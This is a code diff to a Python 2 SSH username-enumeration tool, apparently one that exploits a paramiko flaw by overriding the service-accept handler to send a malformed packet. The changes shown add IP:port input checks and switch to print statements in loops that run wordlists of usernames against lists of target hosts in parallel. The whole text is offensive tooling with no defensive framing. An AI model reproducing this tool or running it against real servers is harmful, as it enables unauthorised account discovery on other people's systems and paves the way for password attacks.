@@ -36,9 +36,9 @@ dirName = 'SSHLoginData'
  
 if not os.path.exists(dirName):
     os.mkdir(dirName)
-    print("Directory " , dirName ,  " Created ")
+    print "Directory " , dirName ,  " Created "
 else:    
-    print("Directory " , dirName ,  " already exists")
+    print "Directory " , dirName ,  " already exists"
 
 # store function we will overwrite to malform the packet
 old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
@@ -139,7 +139,7 @@ def trySocket(host, port):
         sock.connect((host, port))
         sock.close()
     except socket.error:
-        print '[-] Connecting to host failed. Please check the specified host and port.'
+        print '[-] Connecting to host: ' + host + 'failed. Please check the specified host and port.'
         # sys.exit(1)
         return False, False
     return host, port
@@ -188,10 +188,12 @@ def run_line():
                     
                 runArray = []    
                 for lines in f:
-                    host = lines.split(':')
-                    host, port = trySocket(host[0],int(host[1].strip()))
-                    runArray.append([host, port,args.username])
-
+                    if ":" in lines:
+                        host = lines.split(':')
+                        host, port = trySocket(host[0],int(host[1].strip()))
+                        runArray.append([host, port,args.username])
+                    else:
+                        print "File is in wrong format. Should be IP:port on seperate lines"
                 pool = multiprocessing.Pool(args.threads)
                 results = pool.map(checkUsername, runArray)
 
@@ -240,23 +242,26 @@ def run_line():
                     sys.exit(3)
                     
                 for lines in f1:
-                    host = lines.split(':')
-                    host, port = trySocket(host[0],int(host[1].strip()))
-                    if host != False:
-                        try :                   
-                            f2 = open(args.custuserList)
-                        except IOError:
-                            print "[-] File doesn't exist or is unreadable."
-                            sys.exit(3)
-                            
-                        runArray = []
-                        for temp in f2.readlines():
-                            runArray.append([host,port,temp.strip()])
-                            
-                        f2.close()
-                        pool = multiprocessing.Pool(args.threads)
-                        results = pool.map(checkUsername, runArray)
-                        print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
+                    if ":" in lines:
+                        host = lines.split(':')
+                        host, port = trySocket(host[0],int(host[1].strip()))
+                        if host != False:
+                            try :                   
+                                f2 = open(args.custuserList)
+                            except IOError:
+                                print "[-] File doesn't exist or is unreadable."
+                                sys.exit(3)
+                                
+                            runArray = []
+                            for temp in f2.readlines():
+                                runArray.append([host,port,temp.strip()])
+                                
+                            f2.close()
+                            pool = multiprocessing.Pool(args.threads)
+                            results = pool.map(checkUsername, runArray)
+                            print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
+                    else:
+                        print "File is in wrong format. Should be IP:port on seperate lines"
         elif args.userList: #username list passed in
             if args.hostname:
                 try:
@@ -291,28 +296,31 @@ def run_line():
                     sys.exit(3)
                     
                 for lines in f1:
-                    host = lines.split(':')
-                    host, port = trySocket(host[0],int(host[1].strip()))
-                    if host != False:
-                        try :                   
-                            if args.userList == "small":
-                                f2 = open("small")
-                            if args.userList == "medium":
-                                f2 = open("medium")
-                            if args.userList == "large":
-                                f2 = open("large")
-                        except IOError:
-                            print "[-] File doesn't exist or is unreadable."
-                            sys.exit(3)
-                            
-                        runArray = []
-                        for temp in f2.readlines():
-                            runArray.append([host,port,temp.strip()])
-                            
-                        f2.close()
-                        pool = multiprocessing.Pool(args.threads)
-                        results = pool.map(checkUsername, runArray)
-                        print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
+                    if ":" in lines:
+                        host = lines.split(':')
+                        host, port = trySocket(host[0],int(host[1].strip()))
+                        if host != False:
+                            try :                   
+                                if args.userList == "small":
+                                    f2 = open("small")
+                                if args.userList == "medium":
+                                    f2 = open("medium")
+                                if args.userList == "large":
+                                    f2 = open("large")
+                            except IOError:
+                                print "[-] File doesn't exist or is unreadable."
+                                sys.exit(3)
+                                
+                            runArray = []
+                            for temp in f2.readlines():
+                                runArray.append([host,port,temp.strip()])
+                                
+                            f2.close()
+                            pool = multiprocessing.Pool(args.threads)
+                            results = pool.map(checkUsername, runArray)
+                            print "Running time - Host: " + host + " done in " + str(datetime.now() - startTime) + "\n"
+                        else:
+                            print "File is in wrong format. Should be IP:port on seperate lines"
         else: # no usernames passed in
             print "[-] No usernames provided to check"
             sys.exit(4)
